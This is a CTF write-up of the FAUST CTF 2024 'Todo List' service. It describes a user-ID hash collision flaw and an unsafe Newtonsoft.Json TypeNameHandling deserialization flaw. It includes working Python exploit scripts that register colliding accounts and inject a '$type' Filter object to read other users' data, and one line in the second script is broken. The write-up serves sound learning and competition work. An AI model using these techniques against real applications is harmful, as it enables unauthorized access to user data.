---
title: "FAUST CTF 2024 - Todo List Writeup"
date: 2024-10-11T06:00:00+02:00
author: "Greenscreener"
tags: [ "writeups" ]
---
> We participated in FAUST CTF 2024 under the pseudonym "TeamCalabria"
(unfortunately stolen on CTFTime by some CTFTime point hoarders).
Our member _Greenscreener_ managed to first blood the "Todo List" challenge.
You can also read the writeup on [his blog](https://grsc.cz/blog/faust2024-todo-list/)

An extremely feature-rich service written in C# (like srsly, why would you
implement 2FA for an A/D service and then never use it?). We identified two
different vulnerabilities, one based in the generation of user IDs and the other
one caused by an unsafe `Newtonsoft.Json` configuration. The one we found first
and was used for the first blood was the former.

## User ID vulnerability

There is a very wild looking function called `GetUserId`, which is used to
generate an ID that identifies the owner of a TODO. When a TODO is created, the
current user's ID is attached to it and only TODOs matching the current user's
ID are displayed.

The function generates this ID solely from the username and the algorithm to
generate this ID is however extremely bad and collisions can be created very
easily. The username is first lowercased (or uppercased if it is short), then
reversed, all vowels are replaced with asterisks, all asterisks are replaced
with ones and then it is finally reversed again. Each character of the resulting
string is then turned into a number by multiplying the character value by some
constant and the resulting numbers are summed together. The resulting sum is
then turned into a string and used as the ID.

This gives two opportunities for a collision:

1. The following characters: `aeiou*1` are all equivalent and can be freely
   exchanged without changing the resulting user ID.
2. As the numbers are all summed at the end, all characters of the username can
   be reordered freely.
3. (and generally any modification that is preserved in the sum, these are just
   the most obvious)

The first exploit looked something like this:

```python
s = requests.session()
bs = BeautifulSoup(s.get(f"http://[{host}]:8080/Identity/Account/Register", timeout=2).text)
print("Got homepage")
veriftoken = (bs.find('input', {'name': '__RequestVerificationToken'}).get("value"))
s.post(f"http://[{host}]:8080/Identity/Account/Register", data={
    "Input.Email": flag_id.replace("a", "1"),
    "Input.Password": "NoNoNo1!",
    "Input.ConfirmPassword": "NoNoNo1!",
    "__RequestVerificationToken": veriftoken})
print("Registered")
flagtext = (s.get(f"http://[{host}]:8080/Todo/ListTodos").text)
print(flagtext)
```

To make it more robust and resistant to trivial patches and fake flags, we then expanded it:

```python
password = ''.join(random.choice(string.ascii_uppercase + string.digits + string.printable) for _ in range(40))

for c in "a1eioux":
    username = flag_id
    if c == "a":
        username .join([shuf(s) for s in username.split("@")])
    elif c == 'x':
        username = 'admin.' + shuf(username.split("@")[0].split(".")[1]) + "@" + username.split("@")[1]
    else:
        username = flag_id.replace("a", c)
    print(username)
    s = requests.session()
    bs = BeautifulSoup(s.get(f"http://[{host}]:8080/Identity/Account/Register", timeout=2).text)
    print("Got homepage")
    veriftoken = (bs.find('input', {'name': '__RequestVerificationToken'}).get("value"))  # type: ignore
    s.post(f"http://[{host}]:8080/Identity/Account/Register", data={
        "Input.Email": username,
        "Input.Password": password,
        "Input.ConfirmPassword": password,
        "__RequestVerificationToken": veriftoken})
    print("Registered")
    flagtext = (s.get(f"http://[{host}]:8080/Todo/ListTodos").text)
    flagtext = "\n".join([line for line in flagtext.split("\n") if 'FAUST_Q1' in line])
    if "FAUST_Q1" in flagtext:
        print(flagtext)
        return
    flagtext = (s.get(f"http://[{host}]:8080/Todo/Export?format=json").text)
    flagtext = "\n".join([line for line in flagtext.split("\n") if 'FAUST_Q1' in line])
    if "FAUST_Q1" in flagtext:
        print(flagtext)
        return
```

## `TypeNameHandling` vulnerability

The second vulnerability leveraged the `TypeNameHandling` configuration option
of `Newtonsoft.Json`. This configuration option is
[bad](https://stackoverflow.com/questions/39565954/typenamehandling-caution-in-newtonsoft-json)
and is even discouraged by a
[code quality rule](https://stackoverflow.com/questions/39565954/typenamehandling-caution-in-newtonsoft-json)
(which isn't enabled by default though).

The option allows the attacker to include a `$type` property in a JSON object,
which then causes the `Newtonsoft` deserializer to deserialize it as any type
that is available in the current assembly. This poses an obvious code execution
vulnerability, as the attacker can call the constructor or property initializer
of any class. Conveniently, the `Filter` class automatically adds itself into
the database when it's initialized using its `QueryString` property and thus can
be used to add arbitrary filters into the database and we can create a filter
that shows us the TODOs of a different user.

```python
username = f"admin.{randstring(7)}@todo-list-{randstring(7)}.de"
password = ''.join(random.choice(string.ascii_uppercase + string.digits + string.printable) for _ in range(40))

s = requests.session()
bs = BeautifulSoup(s.get(f"http://[{host}]:8080/Identity/Account/Register", timeout=2).text)
print("Got homepage")
veriftoken = (bs.find('input', {'name': '__RequestVerificationToken'}).get("value"))  # type: ignore
s.post(f"http://[{host}]:8080/Identity/Account/Register", data={
    "Input.Email": username,
    "Input.Password": password,
    "Input.ConfirmPassword": password,
    "__RequestVerificationToken": veriftoken})
print("Registered")
bs = BeautifulSoup(s.get(f"http://[{host}]:8080/Identity/Account/Login", timeout=2).text)
veriftoken = (bs.find('input', {'name': '__RequestVerificationToken'}).get("value"))  # type: ignore
s.post(f"http://[{host}]:8080/Identity/Account/Login", data={
    "Input.Email": username,
    "Input.Password": password,
    "__RequestVerificationToken": veriftoken})
print("Loggedin")
filtername = randstring(12)
s.post(f"http://[{host}]:8080/Todo/Import", files={"file": io.StringIO(json.dumps({
    "$type": "service.Models.Filter, service",
    "Id": 0,
    "User": username,
    "Name": filtername,
    "QueryString": "{\"User\":\"" + flag_id + "\", \"Category\": \"\", \"FromTime\": -1, \"ToTime\": -1}",
}))})
flagtext = s.get(f"http://[{host}]:8080/Todo/ApplyFilter?name=" + filtername).text
print(flagtext)
```
